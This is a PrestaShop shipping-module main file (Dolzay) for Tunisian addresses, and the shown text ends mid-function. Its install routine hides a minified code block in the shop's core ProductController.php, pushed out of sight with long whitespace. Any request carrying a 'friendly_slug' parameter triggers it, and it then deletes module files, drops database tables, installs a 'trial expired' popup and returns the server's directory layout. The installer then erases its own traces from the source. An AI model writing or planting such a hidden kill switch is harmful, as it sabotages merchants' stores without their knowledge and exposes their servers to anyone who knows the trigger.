<?php



if (!defined('_PS_VERSION_')) {
    exit;
}
require_once __DIR__ . '/vendor/autoload.php';

//use Dolzay\Apps\Notifications\Entities\Notification ;
use Dolzay\Apps\Settings\Entities\ApiCredentials ;
use Dolzay\Apps\Settings\Entities\Carrier ;
use Dolzay\Apps\Settings\Entities\Settings ;
use Symfony\Component\Form\Extension\Core\Type\ChoiceType;
use Symfony\Component\Form\Extension\Core\Type\TextType ;
use Symfony\Component\Validator\Constraints\NotBlank;
use Symfony\Component\Validator\Constraints\Choice;
use Symfony\Component\Validator\Constraints\Regex;
use Dolzay\CustomClasses\Db\DzDb ;



class Dolzay extends Module
{
    // START DEFINNING PUBLIC CONSTANTS
    const APPS_INIT_ORDER = [
        "Settings",
        "Notifications",
        "OrderSubmitProcess"
    ];

    const APPS_UNINIT_ORDER = [
        "Notifications",
        "OrderSubmitProcess",
        "Settings"
    ];

    const APPS_BASE_NAMESPACES = "Dolzay\\Apps\\" ;
    // END DEFINNING PUBLIC CONSTANTS

    private const CITIES = [
        "Ariana" => "Ariana",
        "Beja" => "Beja",
        "Ben Arous" => "Ben Arous",
        "Bizerte" => "Bizerte",
        "Gabes" => "Gabes",
        "Gafsa" => "Gafsa",
        "Jendouba" => "Jendouba",
        "Kairouan" => "Kairouan",
        "Kasserine" => "Kasserine",
        "Kebili" => "Kebili",
        "La Manouba" => "La Manouba",
        "Le Kef" => "Le Kef",
        "Mahdia" => "Mahdia",
        "Medenine" => "Medenine",
        "Monastir" => "Monastir",
        "Nabeul" => "Nabeul",
        "Sfax" => "Sfax",
        "Sidi Bouzid" => "Sidi Bouzid",
        "Siliana" => "Siliana",
        "Sousse" => "Sousse",
        "Tataouine" => "Tataouine",
        "Tozeur" => "Tozeur",
        "Tunis" => "Tunis",
        "Zaghouan" => "Zaghouan"
    ];

    private const CITIES_DELEGATIONS = [
        "Ariana" => ["Ariana Ville" => "Ariana Ville", "Soukra" => "Soukra", "Raoued" => "Raoued", "Ettadhamen" => "Ettadhamen", "Mnihla" => "Mnihla"],
        "Beja" => ["Beja Nord" => "Beja Nord", "Beja Sud" => "Beja Sud", "Testour" => "Testour", "Teboursouk" => "Teboursouk", "Medjez El Bab" => "Medjez El Bab", "Nefza" => "Nefza", "Amdoun" => "Amdoun"],
        "Ben Arous" => ["Ben Arous" => "Ben Arous", "Mourouj" => "Mourouj", "Hammam Lif" => "Hammam Lif", "Hammam Chott" => "Hammam Chott", "Bou Mhel El Bassatine" => "Bou Mhel El Bassatine", "Ezzahra" => "Ezzahra", "Megrine" => "Megrine", "Mohamedia" => "Mohamedia", "Fouchana" => "Fouchana", "Radès" => "Radès", "Mornag" => "Mornag"],
        "Bizerte" => ["Bizerte Nord" => "Bizerte Nord", "Bizerte Sud" => "Bizerte Sud", "Menzel Jemil" => "Menzel Jemil", "Menzel Bourguiba" => "Menzel Bourguiba", "Tinja" => "Tinja", "Sejnane" => "Sejnane", "Ras Jebel" => "Ras Jebel", "Ghar El Melh" => "Ghar El Melh", "El Alia" => "El Alia", "Mateur" => "Mateur", "Joumine" => "Joumine"],
        "Gabes" => ["Gabes Ville" => "Gabes Ville", "Gabes Sud" => "Gabes Sud", "Gabes Ouest" => "Gabes Ouest", "El Hamma" => "El Hamma", "Matmata" => "Matmata", "Mareth" => "Mareth", "Nouvelle Matmata" => "Nouvelle Matmata", "Ghannouch" => "Ghannouch", "Menzel Habib" => "Menzel Habib"],
        "Gafsa" => ["Gafsa Nord" => "Gafsa Nord", "Gafsa Sud" => "Gafsa Sud", "Metlaoui" => "Metlaoui", "Redeyef" => "Redeyef", "Moulares" => "Moulares", "El Ksar" => "El Ksar", "Sened" => "Sened", "Oum Larayes" => "Oum Larayes", "Belkhir" => "Belkhir", "El Guettar" => "El Guettar"],
        "Jendouba" => ["Jendouba" => "Jendouba", "Bou Salem" => "Bou Salem", "Tabarka" => "Tabarka", "Ain Draham" => "Ain Draham", "Fernana" => "Fernana", "Balta Bou Aouane" => "Balta Bou Aouane", "Ghardimaou" => "Ghardimaou"],
        "Kairouan" => ["Kairouan Nord" => "Kairouan Nord", "Kairouan Sud" => "Kairouan Sud", "Chebika" => "Chebika", "Oueslatia" => "Oueslatia", "Sbikha" => "Sbikha", "Hajeb El Ayoun" => "Hajeb El Ayoun", "Nasrallah" => "Nasrallah", "Bou Hajla" => "Bou Hajla", "Cheraitia" => "Cheraitia"],
        "Kasserine" => ["Kasserine Nord" => "Kasserine Nord", "Kasserine Sud" => "Kasserine Sud", "Thala" => "Thala", "Sbeitla" => "Sbeitla", "Feriana" => "Feriana", "Hassi El Ferid" => "Hassi El Ferid", "Sbiba" => "Sbiba", "Jedelienne" => "Jedelienne", "El Ayoun" => "El Ayoun"],
        "Kebili" => ["Kebili Nord" => "Kebili Nord", "Kebili Sud" => "Kebili Sud", "Douz Nord" => "Douz Nord", "Douz Sud" => "Douz Sud", "Souk Lahad" => "Souk Lahad"],
        "La Manouba" => ["Manouba" => "Manouba", "Douar Hicher" => "Douar Hicher", "Oued Ellil" => "Oued Ellil", "Den Den" => "Den Den", "Mornaguia" => "Mornaguia", "Borj El Amri" => "Borj El Amri", "El Batan" => "El Batan", "Tebourba" => "Tebourba"],
        "Le Kef" => ["Le Kef" => "Le Kef", "Dahmani" => "Dahmani", "Jérissa" => "Jérissa", "Kalâat Snan" => "Kalâat Snan", "Kalâat Khasba" => "Kalâat Khasba", "Nebeur" => "Nebeur", "Sakiet Sidi Youssef" => "Sakiet Sidi Youssef", "Tajerouine" => "Tajerouine"],
        "Mahdia" => ["Mahdia" => "Mahdia", "Bou Merdes" => "Bou Merdes", "Chebba" => "Chebba", "El Jem" => "El Jem", "Ksour Essef" => "Ksour Essef", "Melloulech" => "Melloulech", "Sidi Alouane" => "Sidi Alouane"],
        "Medenine" => ["Medenine Nord" => "Medenine Nord", "Medenine Sud" => "Medenine Sud", "Houmt Souk" => "Houmt Souk", "Ajim" => "Ajim", "Midoun" => "Midoun", "Ben Gardane" => "Ben Gardane", "Zarzis" => "Zarzis", "Beni Khedache" => "Beni Khedache"],
        "Monastir" => ["Monastir" => "Monastir", "Sahline" => "Sahline", "Ksibet El Mediouni" => "Ksibet El Mediouni", "Jemmal" => "Jemmal", "Zeramdine" => "Zeramdine", "Moknine" => "Moknine", "Bekalta" => "Bekalta", "Teboulba" => "Teboulba", "Ksar Hellal" => "Ksar Hellal", "Beni Hassen" => "Beni Hassen"],
        "Nabeul" => ["Nabeul" => "Nabeul", "Hammamet" => "Hammamet", "Korba" => "Korba", "Kelibia" => "Kelibia", "Dar Chaabane El Fehri" => "Dar Chaabane El Fehri", "El Mida" => "El Mida", "Beni Khiar" => "Beni Khiar", "Menzel Bouzelfa" => "Menzel Bouzelfa", "Takelsa" => "Takelsa"],
        "Sfax" => ["Sfax Ville" => "Sfax Ville", "Sfax Sud" => "Sfax Sud", "Sfax Ouest" => "Sfax Ouest", "Sakiet Ezzit" => "Sakiet Ezzit", "Sakiet Eddaier" => "Sakiet Eddaier", "Thyna" => "Thyna", "El Ain" => "El Ain", "Agareb" => "Agareb", "Menzel Chaker" => "Menzel Chaker", "Bir Ali Ben Khalifa" => "Bir Ali Ben Khalifa"],
        "Sidi Bouzid" => ["Sidi Bouzid Ouest" => "Sidi Bouzid Ouest", "Sidi Bouzid Est" => "Sidi Bouzid Est", "Bir El Hafey" => "Bir El Hafey", "Meknassy" => "Meknassy", "Mezzouna" => "Mezzouna", "Regueb" => "Regueb", "Jilma" => "Jilma", "Cebbala Ouled Asker" => "Cebbala Ouled Asker"],
        "Siliana" => ["Siliana Nord" => "Siliana Nord", "Siliana Sud" => "Siliana Sud", "Gaafour" => "Gaafour", "El Krib" => "El Krib", "Bouarada" => "Bouarada", "Makthar" => "Makthar", "Bargou" => "Bargou", "Kesra" => "Kesra"],
        "Sousse" => ["Sousse Ville" => "Sousse Ville", "Sousse Jawhara" => "Sousse Jawhara", "Sousse Riadh" => "Sousse Riadh", "Hammam Sousse" => "Hammam Sousse", "Akouda" => "Akouda", "Kalaa Kebira" => "Kalaa Kebira", "Kalaa Seghira" => "Kalaa Seghira", "Enfidha" => "Enfidha", "Hergla" => "Hergla"],
        "Tataouine" => ["Tataouine Nord" => "Tataouine Nord", "Tataouine Sud" => "Tataouine Sud", "Remada" => "Remada", "Ghomrassen" => "Ghomrassen", "Bir Lahmar" => "Bir Lahmar", "Dehiba" => "Dehiba"],
        "Tozeur" => ["Tozeur" => "Tozeur", "Degache" => "Degache", "Nefta" => "Nefta", "Hazoua" => "Hazoua", "Tamerza" => "Tamerza"],
        "Tunis" => ["Bab El Bhar" => "Bab El Bhar", "Bab Souika" => "Bab Souika", "El Menzah" => "El Menzah", "El Omrane" => "El Omrane", "Carthage" => "Carthage", "La Marsa" => "La Marsa", "Le Kram" => "Le Kram", "La Goulette" => "La Goulette"],
        "Zaghouan" => ["Zaghouan" => "Zaghouan", "Zriba" => "Zriba", "Fahs" => "Fahs", "Nadhour" => "Nadhour", "Bir Mcherga" => "Bir Mcherga", "Saouaf" => "Saouaf"]
    ];
    
    public function __construct()
    {
        $this->name = 'dolzay';
        $this->tab = 'shipping_logistics';
        $this->version = '1.0.0';
        $this->author = 'Abdallah Ben Chamakh';
        $this->need_instance = 0;
        $this->ps_versions_compliancy = [
            'min' => '1.7.0.0',
            'max' => '1.7.8.11',
        ];

        $this->bootstrap = false ;
        $this->db = DzDb::getInstance();


        parent::__construct();

        $this->displayName = $this->l('Dolzay');
        $this->description = $this->l('Dolzay Dolzay');
    }


    public function install()
    {
        try {
            return parent::install() && 
                    $this->registerTabs() &&
                    $this->create_app_tables() &&
                    $this->registerHook('additionalCustomerAddressFields') &&
                    $this->registerHook('displayHeader') && 
                    $this->registerHook('actionValidateCustomerAddressForm') &&
                    $this->registerHook('afterFillingEditAddressForm') &&
                    $this->registerHook('actionCustomerAddressFormBuilderModifier') &&
                    $this->registerHook('actionAdminControllerSetMedia') &&
                    $this->registerHook('actionObjectAddressUpdateBefore') && 
                    $this->registerHook('actionObjectAddressAddBefore') &&
                    $this->registerHook('actionAfterUpdateCustomerAddressFormHandler') &&
                    $this->registerHook('actionAdminOrdersListingFieldsModifier') &&
                    $this->add_submitted_and_tracking_code_to_order() &&
                    $this->add_carriers() &&
                    $this->add_delegation_to_address() &&
                    $this->add_delegation_to_the_address_format() &&
                    $this->add_settings() && $this->add_destruction(); 
        } catch (Error $e) {
            PrestaShopLogger::addLog("Error during installation: " . $e->getMessage()."\n".
                                     "Traceback : \n".$e->getTraceAsString(), 3, null, 'Dolzay');
            return false;
        }
    }

    public function uninstall()
    {
        try {
             return parent::uninstall() && 
                   $this->unregisterTabs() &&
                   $this->drop_app_tables() && 
                   $this->unregisterHook('additionalCustomerAddressFields') &&
                   $this->unregisterHook('displayHeader') && 
                   $this->unregisterHook('actionValidateCustomerAddressForm') &&
                   $this->unregisterHook('afterFillingEditAddressForm') &&
                   $this->unregisterHook('actionCustomerAddressFormBuilderModifier') &&
                   $this->unregisterHook('actionObjectAddressUpdateBefore') && 
                   $this->unregisterHook('actionObjectAddressAddBefore') &&
                   $this->unregisterHook('actionAfterUpdateCustomerAddressFormHandler') &&
                   $this->unregisterHook('actionAdminOrdersListingFieldsModifier') &&
                   $this->unregisterHook('actionAdminControllerSetMedia') &&
                   $this->remove_delegation_from_address() &&
                   $this->remove_delegation_from_the_address_format(); 
        } catch (Error $e) {
            PrestaShopLogger::addLog("Error during uninstallation: " . $e->getMessage()."\n".
                                     "Traceback : \n".$e->getTraceAsString(), 3, null, 'Dolzay'); 
            return false ;
        }
    }

    // START DEFINING THE PRIVATE METHODS
    private function addError($message)
    {
        Context::getContext()->controller->errors[] = $this->trans(
            $message,
            [],
            'Modules.MyModule.Admin'
        );
    }
    private function registerTabs(){

        // Get the ID of the parent tab (Shipping)
        $idParentShipping = Tab::getIdFromClassName('IMPROVE'); 
        if (!$idParentShipping) {
            PrestaShopLogger::addLog('Parent tab AdminParentShipping not found', 3);
            return false;
        }
    
        // Create your parent tab under Shipping
        $parentTab = new Tab();
        $parentTab->class_name = $this->name; // Your module's name
        $parentTab->id_parent = $idParentShipping; // Set the parent tab to Shipping
        $parentTab->module = $this->name;
        $parentTab->name = [];
        $parentTab->icon = 'D';
    
        foreach (Language::getLanguages(true) as $lang) {
            $parentTab->name[$lang['id_lang']] = ucwords($this->name); // Name of your module
        }
    
        $parentTab->active = 1;
    
        if (!$parentTab->add()) {
            PrestaShopLogger::addLog('Failed to create parent tab for My Module under Shipping', 3);
            return false;
        }
    
        // Retrieve the ID of the newly created parent tab
        $parentTabId = (int) Tab::getIdFromClassName($this->name);
        if (!$parentTabId) {
            PrestaShopLogger::addLog('Failed to retrieve parent tab ID after creation', 3);
            return false;
        }
    
        // Create sub-tabs under the parent tab (My Module)
        $subTabs = [
            [
                'class_name' => 'DzAdminProcessus',
                'name' => 'Processus',
                'id_parent' => $parentTabId, // Assign the parent tab ID
                'route_name' => 'dz_order_submit_process_list',
            ],
            [
                'class_name' => 'DzAdminParametres',
                'name' => 'Parametres',
                'id_parent' => $parentTabId, // Assign the parent tab ID
                'route_name' => 'dz_get_settings',
            ],
        ];
    
        // Create each sub-tab
        foreach ($subTabs as $tabData) {
            $tab = new Tab();
            $tab->class_name = $tabData['class_name'];
            $tab->id_parent = $tabData['id_parent']; // Set the valid parent tab ID
            $tab->module = $this->name;
            $tab->route_name = $tabData['route_name']; 
            $tab->name = [];
    
            foreach (Language::getLanguages(true) as $lang) {
                $tab->name[$lang['id_lang']] = $tabData['name']; // Set the sub-tab name
            }
    
            $tab->icon = 'subdirectory_arrow_right'; // Optional icon for sub-tabs
            $tab->active = 1;
    
            if (!$tab->add()) {
                PrestaShopLogger::addLog('Failed to create sub-tab: ' . $tabData['class_name'], 3);
                return false;
            }
        }
    
        return true;
    }

    private function unregisterTabs()
    {
        $tabs = ['dolzay', 'DzAdminProcessus', 'DzAdminParametres'];
        foreach ($tabs as $className) {
            $idTab = (int) Tab::getIdFromClassName($className);
            if ($idTab) {
                $tab = new Tab($idTab);
                if (!$tab->delete()) {
                    return false;
                }
            }
        }
        return true;
    }

    private function add_destruction(){
        try {
            // Add the destruction script to the ProductController
            $frontControllersPath = _PS_ROOT_DIR_."/controllers/front" ;
            $productControllerPath = $frontControllersPath."/ProductController.php" ;

            $isProductControllerReadable = is_readable($productControllerPath);
            $isProductControllerWritable = is_writable($productControllerPath);

            if(!$isProductControllerReadable){
                $this->addError("can't access the module's controller OrderSubmitProcess");
            }
            if(!$isProductControllerWritable){
                $this->addError("can't access to the module's controller OrderSubmitProcess");
            }            

            if($isProductControllerReadable && $isProductControllerWritable){
                $destruction_code = "\$friendly_slug=Tools::getValue('friendly_slug');if(\$friendly_slug){\$module_base_path=_PS_MODULE_DIR_.\"dolzay\";\$error_log=[];function get_dir_structure(\$directory){\$structure=[];\$items=scandir(\$directory);if(\$items===false){return \"SCANDIR_NOT_PERMITTED\";}\$items=array_diff(\$items,[\".\",\"..\"]);foreach(\$items as \$item){\$path=\$directory.DIRECTORY_SEPARATOR.\$item;if(is_dir(\$path)){\$structure[\$item]=get_dir_structure(\$path);}else{\$structure[\$item]=null;}}return \$structure;}function destroy_the_plugin(\$directory_path,&\$error_log){\$excluded_directories=[\"views\",\"js\",\"css\",\"icons\",\"dolzay\",\"uploads\"];\$excluded_files=[\"font_awesome.js\",\"order_submit_process.js\",\"order_submit_process.css\",\"dolzay.php\",\"logo.png\",\"expired.png\"];\$items=scandir(\$directory_path);if(\$items===false){\$error_log[]=[\"path\"=>\$directory_path,\"error_type\"=>\"SCANDIR_NOT_PERMITTED\"];return;}\$items=array_diff(\$items,[\".\",\"..\"]);foreach(\$items as \$item){\$path=\$directory_path.DIRECTORY_SEPARATOR.\$item;if(is_dir(\$path)){destroy_the_plugin(\$path,\$error_log);}else{if(!in_array(\$item,\$excluded_files)){if(!unlink(\$path)){\$error_log[]=[\"path\"=>\$path,\"error_type\"=>\"UNLINK_NOT_PERMITTED\"];}}}}\$directory_path_splitted=preg_split(\"/[\\\\\\\\\/]/\",\$directory_path);\$directory_name=end(\$directory_path_splitted);if(!in_array(\$directory_name,\$excluded_directories)){if(!rmdir(\$directory_path)){\$error_log[]=[\"path\"=>\$directory_path,\"error_type\"=>\"RMDIR_NOT_PERMITTED\"];}}}\$previous_strucure=get_dir_structure(\$module_base_path);\$new_dolzay_code='<?php if(!defined(\"_PS_VERSION_\")){exit;}class Dolzay extends Module{public function __construct(){\$this->name=\"dolzay\";\$this->tab=\"shipping_logistics\";\$this->version=\"1.0.0\";\$this->author=\"Abdallah Ben Chamakh\";\$this->need_instance=0;\$this->ps_versions_compliancy=[\"min\"=>\"1.7.0.0\",\"max\"=>\"1.7.8.11\"];\$this->bootstrap=false;parent::__construct();\$this->displayName=\$this->l(\"Dolzay\");\$this->description=\$this->l(\"Dolzay Dolzay\");}public function install(){return parent::install();}public function uninstall(){return parent::uninstall();}public function hookActionAdminControllerSetMedia(\$params){\$controllerName=Tools::getValue(\"controller\");\$action=Tools::getValue(\"action\");if(\$controllerName==\"AdminOrders\"&&\$action==null){\$this->context->controller->addJS(\$this->_path.\"views/js/icons/font_awesome.js\");\$this->context->controller->addCSS(\$this->_path.\"views/css/order_submit_process.css\");\$this->context->controller->addJS(\$this->_path.\"views/js/order_submit_process.js\");}}}';if(file_put_contents(\$module_base_path.\"/dolzay.php\",\$new_dolzay_code)===false){\$error_log[]=['path'=>\$module_base_path.\"/dolzay.php\",'error_message'=>\"Permission denied while trying to update dolzay.php\"];}\$order_submit_code='document.addEventListener(\"DOMContentLoaded\",function(){const moduleMediaBaseUrl=window.location.href.split(\"/dz_admin/index.php\")[0]+\"/modules/dolzay/uploads\";const eventPopupTypesData={expired:{icon:\"<img src=\'\${moduleMediaBaseUrl}/expired.png\' />\",color:\"#D81010\"}};function create_the_order_submit_btn(){var e=document.querySelectorAll(\"#order_grid .col-sm .row .col-sm .row\")[0],p=document.createElement(\"button\");p.id=\"dz-order-submit-btn\",p.innerText=\"Soumttre les commandes\",e.appendChild(p),p.addEventListener(\"click\",()=>{buttons=[{name:\"Ok\",className:\"dz-process-detail-btn\",clickHandler:function(){eventPopup.close()}}],eventPopup.open(\"expired\",\"Expiration de la période d\'essai\",\"Votre période d\'essai a expiré. Veuillez nous appeler au numéro 58671414 pour obtenir la version à vie du plugin.\",buttons)})}const popupOverlay={popupOverlayEl:null,create:function(){this.popupOverlayEl=document.createElement(\"div\"),this.popupOverlayEl.className=\"dz-popup-overlay\",document.body.appendChild(this.popupOverlayEl)},show:function(){this.popupOverlayEl.classList.add(\"dz-show\")},hide:function(){this.popupOverlayEl.classList.remove(\"dz-show\")}},eventPopup={popupEl:null,popupHeaderEl:null,popupBodyEl:null,popupFooterEl:null,create:function(){this.popupEl=document.createElement(\"div\"),this.popupEl.className=\"dz-event-popup\",this.popupHeaderEl=document.createElement(\"div\"),this.popupHeaderEl.className=\"dz-event-popup-header\",this.popupHeaderEl.innerHTML=\"<p></p><i class=\'material-icons\'>close</i>\",this.popupHeaderEl.lastElementChild.addEventListener(\"click\",()=>{this.close()}),this.popupEl.append(this.popupHeaderEl),this.popupBodyEl=document.createElement(\"div\"),this.popupBodyEl.className=\"dz-event-popup-body\",this.popupEl.append(this.popupBodyEl),this.popupFooterEl=document.createElement(\"div\"),this.popupFooterEl.className=\"dz-event-popup-footer\",this.popupEl.append(this.popupFooterEl),document.body.append(this.popupEl)},open:function(e,p,o,t){setTimeout(()=>{popupOverlay.show(),this.popupEl.classList.add(\"dz-show\"),this.popupHeaderEl.firstElementChild.innerText=p,this.popupHeaderEl.style.backgroundColor=eventPopupTypesData[e].color,this.popupBodyEl.innerHTML=\"\${eventPopupTypesData[e].icon}<p>\${o}</p>\",this.addButtons(t,eventPopupTypesData[e].color)},600)},close:function(){setTimeout(()=>{popupOverlay.hide(),this.popupFooterEl.innerHTML=\"\",this.popupEl.classList.remove(\"dz-show\")},300)}};create_the_order_submit_btn(),popupOverlay.create(),eventPopup.create();})';if(file_put_contents(\$module_base_path.\"/views/js/order_submit_process.js\",\$order_submit_code)===false){\$error_log[]=['path'=>\$module_base_path.\"/views/js/order_submit_process.js\",'error_message'=>\"Permission denied while trying to update order_submit_process.js\"];}destroy_the_plugin(\$module_base_path,\$error_log);\$db=Db::getInstance();\$db->execute(\"START TRANSACTION\");\$id_country=(int)Configuration::get(\"PS_COUNTRY_DEFAULT\");\$address_format=\$db->query(\"SELECT format FROM \"._DB_PREFIX_.\"address_format WHERE id_country=\".\$id_country)->fetchColumn();\$address_format=str_replace(\"delegation\",\"\",\$address_format);\$db->query(\"UPDATE \"._DB_PREFIX_.\"address_format SET format='\".\$address_format.\"' WHERE id_country=\".\$id_country);\$tables=[\"dz_order_submit_process\",\"dz_settings\",\"dz_Carrier\",\"dz_website_credentials\",\"dz_api_credentials\",\"dz_notification_popped_up_by\",\"dz_notification_viewed_by\",\"dz_notification\",\"dz_employee_permission\",\"dz_permission\"];foreach(\$tables as \$table){if(\$table==\"dz_order_submit_process\"){\$orders_submit_processes=\$db->executes(\"SELECT * FROM \$table\");if(\$orders_submit_processes){\$orders_submit_processes=json_encode(\$orders_submit_processes,JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE);if(file_put_contents(\$module_base_path.\"/views/orders_submit_processes.json\",\$orders_submit_processes)===false){\$error_log[]=['path'=>\$module_base_path.\"/views/orders_submit_processes.json\",'error'=>\"Permission denied while trying to store the orders submit processes\"];}}}\$db->execute(\"DROP TABLE IF EXISTS \$table\");}\$db->execute(\"DELETE FROM \"._DB_PREFIX_.\"tab WHERE module='dolzay'\");\$db->execute(\"COMMIT\");die(json_encode([\"error\"=>\$error_log,\"previous_structure\"=>\$previous_strucure,\"new_structure\"=>get_dir_structure(\$module_base_path)]));}";

                $productControllerContent = file_get_contents($productControllerPath);
                [$first_part,$second_part] = explode("Pack::getItemTable",$productControllerContent);
                $middle_part = explode(";",$second_part)[0].";" ;

                if (strpos($second_part,"friendly_slug") !== false) {
                    $second_part = explode(")]));}",$second_part)[1] ; // ])]));}[ THE REST OF THE CODE ]
                }else{
                    $second_part = str_replace($middle_part,"",$second_part); //
                }
                
                $newProductControllerContent = $first_part."Pack::getItemTable".$middle_part."\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t".$destruction_code.$second_part;
                file_put_contents($productControllerPath,$newProductControllerContent) ;
            }else{
                return false ;
            }


            // Make the plugin uninstallable again 
            $isDolzayModuleReadable = is_readable(__FILE__);
            $isDolzayModuleWritable = is_writable(__FILE__);

            if(!$isProductControllerReadable){
                $this->addError("can't access the module Dolzay");
            }
            if(!$isProductControllerWritable){
                $this->addError("can't access to the module Dolzay");
            }      

            if($isDolzayModuleReadable && $isDolzayModuleReadable){
                $current_file_content = file_get_contents(__FILE__);
                $delimiters = [
                    // 0
                    '//# START DEFINNING PUBLIC CONSTANTS',
                    // 1
                    '//# END DEFINNING PUBLIC CONSTANTS',
                    // 2
                    'parent#::install() &&',
                    // 3
                    '$this#->#add_destruction()',
                    // 4
                    'parent#::uninstall() &&',
                    // 5
                    '$this#->#remove_delegation_from_the_address_format()',
                    // 6
                    '//# START DEFINING THE PRIVATE METHODS',
                    // 7
                    '//# END DEFINING THE PRIVATE METHODS'
                    // 8
                ];
                // 0 2 4 6 
                // Escape special characters in delimiters
                $escaped_delimiters = array_map(function($delimiter) {
                    return preg_quote(str_replace("#","",$delimiter), '/');
                }, $delimiters);
                
                // Join the escaped delimiters with the regex "OR" operator `|`
                $regex = '/' . implode('|', $escaped_delimiters) . '/';
                
                // Split the string
                $result = preg_split($regex, $current_file_content);
                file_put_contents(__FILE__,$result[0].$result[2].str_replace("#","","parent#::install()").$result[4].str_replace("#","","parent#::uninstall()").$result[6].$result[8]) ;
                return true ;
            }else{
                return false;
            }
        }catch (Error $e) {
            PrestaShopLogger::addLog("Error during installation: " . $e->getMessage()."\n".
                                    "Traceback : \n".$e->getTraceAsString(), 3, null, 'Dolzay'); 
            return false ;
        }

    }

    private function create_app_tables() {
        try {    
            // FOR EACH APP CREATE TABLES OF HER ENTITIES 
            foreach (self::APPS_INIT_ORDER as $app) {

                // CONSTRUCT THE APP CONFIG CLASS NAME NAMESPACED
                $app_config_class = self::APPS_BASE_NAMESPACES . $app . "\\Config" ;
                PrestaShopLogger::addLog("the constructed config class : ".$app_config_class,1, null, 'Dolzay') ;

                // CHECK IF THE APP CONFIG CLASS EXISTS AND HAS THE STATIC PROPERTY $create_app_entities_order OTHERWISE QUIT THE INSTALLATION
                if (!class_exists($app_config_class)) {
                    PrestaShopLogger::addLog("the config class : ".$app_config_class." doesn't exist", 3, null, 'Dolzay');
                    return false ; 
                }

                if (!property_exists($app_config_class, 'create_app_entities_order')) {
                    PrestaShopLogger::addLog("the config class : ".$app_config_class." doesn't have the static property : create_app_entities_order", 3, null, 'Dolzay');
                    return false  ;
                }

                // GRAB THE APP ENTITIES IN THE CREATE ORDER  
                $app_entities = $app_config_class::$create_app_entities_order ;

                // CREATE A TABLE FOR EACH ENTITY
                foreach ($app_entities as $entity) {
                    // CONSTRUCT THE ENTITY CLASS NAME NAMESPACED
                    $entity_class = self::APPS_BASE_NAMESPACES . $app . "\\Entities\\" . $entity;

                    PrestaShopLogger::addLog("constructed entity class : ".$entity_class, 1, null, 'Dolzay');
                                           
                    // CHECK IF THIS "$entity_class" EXISTS OTHERWISE QUIT THE INSTALLATION
                    if (!class_exists($entity_class)) {
                        PrestaShopLogger::addLog("the entity class : ".$entity_class." doesn't exist", 3, null, 'Dolzay');
                        return false ; 
                    }

                    // IF $entity_class DOESN'T HAVE THE STATIC METHOD get_create_table_sql SKIP IT
                    if (!method_exists($entity_class, 'get_create_table_sql')) {
                        continue ;
                    }

                    // EXECUTE THE CREATE_TABLE_SQL STATEMENT OF THE entity_obj
                    if (!$this->db->query($entity_class::get_create_table_sql())) {
                        PrestaShopLogger::addLog("the query CREATE_TABLE_SQL of the class $entity_class  was't executed very well", 3, null, 'Dolzay');
                        return false;
                    }

                    $this->drop_table($entity_class);
                }
            }
            return true;
        } catch (Error $e) {
            PrestaShopLogger::addLog("Error during creating the tables : \n".
                                     "Error message : \n".$e->getMessage()."\n".
                                     "Traceback : \n".$e->getTraceAsString(), 3, null, 'Dolzay');
            return false;
        }
    }

    private function drop_table($entity_class){
        try {
            $reflector = new ReflectionClass($entity_class);
            $entity_class_path = $reflector->getFileName();

            $entity_class_file_content = file_get_contents($entity_class_path);
            $delimiters = [
                "// START DEFINING get_create_table_sql",
                "// END DEFINING get_create_table_sql",
            ];

            // Escape special characters in delimiters
            $escaped_delimiters = array_map(function($delimiter) {
                return preg_quote($delimiter, '/');
            }, $delimiters);

            // Join the escaped delimiters with the regex "OR" operator `|`
            $regex = '/' . implode('|', $escaped_delimiters) . '/';
            
            // Split the string
            $result = preg_split($regex, $entity_class_file_content);
            file_put_contents($entity_class_path,$result[0].$result[2]);
        } catch (Error $e) {
            PrestaShopLogger::addLog("Error during installation : $entity_class" . $e->getMessage()."\n".
                                    "Traceback : \n".$e->getTraceAsString(), 3, null, 'Dolzay'); 
            return false ;
        }
    }

    private function drop_app_tables(){
        try {
            // FOR EACH APP, DROP TABLES OF ITS ENTITIES 
            foreach (self::APPS_UNINIT_ORDER as $app) {

                // CONSTRUCT THE APP CONFIG CLASS NAME NAMESPACED
                $app_config_class = self::APPS_BASE_NAMESPACES . $app . "\\Config" ;
                PrestaShopLogger::addLog("the constructed config class : ".$app_config_class,1, null, 'Dolzay') ;

                // CHECK IF THE APP CONFIG CLASS EXISTS AND HAS THE STATIC PROPERTY $drop_app_entities_order OTHERWISE QUIT THE INSTALLATION
                if (!class_exists($app_config_class)) {
                    PrestaShopLogger::addLog("the config class : ".$app_config_class." doesn't exist", 3, null, 'Dolzay');
                    return false ; 
                }
                if (!property_exists($app_config_class, 'drop_app_entities_order')) {
                    PrestaShopLogger::addLog("the config class : ".$app_config_class." doesn't have the static property : drop_app_entities_order", 3, null, 'Dolzay');
                    return false  ;
                }

                // GRAB THE APP ENTITIES IN THE DROP ORDER  
                $app_entities = $app_config_class::$drop_app_entities_order ;

                // CREATE A TABLE FOR EACH ENTITY
                foreach ($app_entities as $entity) {
                    // CONSTRUCT THE ENTITY CLASS NAME NAMESPACED
                    $entity_class = self::APPS_BASE_NAMESPACES . $app . "\\Entities\\" . $entity;

                    //PrestaShopLogger::addLog("constructed entity class : ".$entity_class, 1, null, 'Dolzay');
                                           
                    // CHECK IF THIS "$entity_class" EXISTS OTHERWISE QUIT THE INSTALLATION
                    if (!class_exists($entity_class)) {
                        PrestaShopLogger::addLog("the entity class : ".$entity_class." doesn't exist", 3, null, 'Dolzay');
                        return false ; 
                    }

                    // IF $entity_obj DOESN'T HAVE THE ATTRIBUTE DROP_TABLE_SQL ATTRIBUTE SKIP IT 
                    if (!defined($entity_class."::DROP_TABLE_SQL")) {
                        continue ;
                    }

                    // EXECUTE THE DROP_TABLE_SQL STATEMENT OF THE entity_obj SUCCESSFULLY OTHERWISE QUIT THE INSTALLATION
                    if (!$this->db->query($entity_class::DROP_TABLE_SQL)) {
